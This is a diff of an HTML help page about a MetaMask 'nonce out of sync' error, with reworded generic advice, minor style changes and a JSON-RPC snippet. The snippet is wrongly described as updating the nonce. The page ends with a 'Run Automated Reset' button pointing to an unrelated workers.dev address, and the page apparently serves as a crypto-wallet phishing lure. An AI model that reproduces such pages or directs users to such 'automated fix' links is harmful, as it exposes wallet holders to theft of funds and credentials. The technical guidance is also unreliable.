@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Metamask Nonce Out Of Sync</title>
 <style>
     body {
-        font-family: sans-serif;
+        font-family: -apple-system;
         background: #121214;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -25,7 +25,7 @@
     }
     a { color: #cf6679; }
     .btn {
-        background: #ff7b2c;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,38 +41,33 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "Nonce out of sync" error when attempting to send a transaction using MetaMask on the Ethereum network.</li>
+<li>The user encounters an error message indicating that their MetaMask nonce is out of sync, preventing them from completing transactions on the Ethereum network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs when the nonce (a counter that increments with each transaction) stored in MetaMask does not match the nonce on the Ethereum blockchain, causing transactions to be rejected.</li>
+<li>The error occurs due to a mismatch between the expected transaction count (nonce) stored in MetaMask and the actual transaction count on the Ethereum blockchain, often caused by cancelled or pending transactions.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Reset the account in MetaMask to synchronize the nonce:</li>
-<li>Go to MetaMask settings</li>
-<li>Select the account with the issue</li>
-<li>Reset the account</li>
-<li>Update the nonce manually using the following command:</li>
+<li>Reset the account in MetaMask to resync the nonce with the blockchain.</li>
+<li>Manually adjust the nonce value in the transaction settings to match the current transaction count on the blockchain.</li>
+<li>Use the following JSON-RPC method to update the nonce:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>eth_sendTransaction<span class="w"> </span><span class="o">{</span><span class="w"> </span>
-<span class="w">  </span><span class="s2">&quot;from&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x...your_address...&quot;</span>,<span class="w"> </span>
-<span class="w">  </span><span class="s2">&quot;to&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x...your_address...&quot;</span>,<span class="w"> </span>
-<span class="w">  </span><span class="s2">&quot;value&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x0&quot;</span>,<span class="w"> </span>
-<span class="w">  </span><span class="s2">&quot;gas&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x5208&quot;</span>,<span class="w"> </span>
-<span class="w">  </span><span class="s2">&quot;gasPrice&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x186a0&quot;</span>,<span class="w"> </span>
-<span class="w">  </span><span class="s2">&quot;nonce&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x...correct_nonce...&quot;</span><span class="w"> </span>
-<span class="o">}</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_getTransactionCount&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;0x742d35Cc6634C0532925a3b844Bc454e4438f44e&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;latest&quot;</span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="p">}</span>
 </code></pre></div>
 
+<p>Consider utilizing an external Ethereum console for more advanced troubleshooting and nonce management.</p>
+<h2>Prerequisites</h2>
 <ul>
-<li>Verify the correct nonce on the Ethereum blockchain using a block explorer.</li>
+<li>MetaMask installed and configured with an Ethereum account.</li>
+<li>A basic understanding of Ethereum transaction mechanics and nonces.</li>
+<li>Access to the Ethereum JSON-RPC API or a compatible interface.</li>
 </ul>
-<p>Prerequisites:
-- MetaMask installed and configured
-- Ethereum account with transactions
-- Basic understanding of Ethereum transaction mechanics</p>
-<p>For more advanced troubleshooting, consider utilizing an external console to execute low-level commands.</p>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
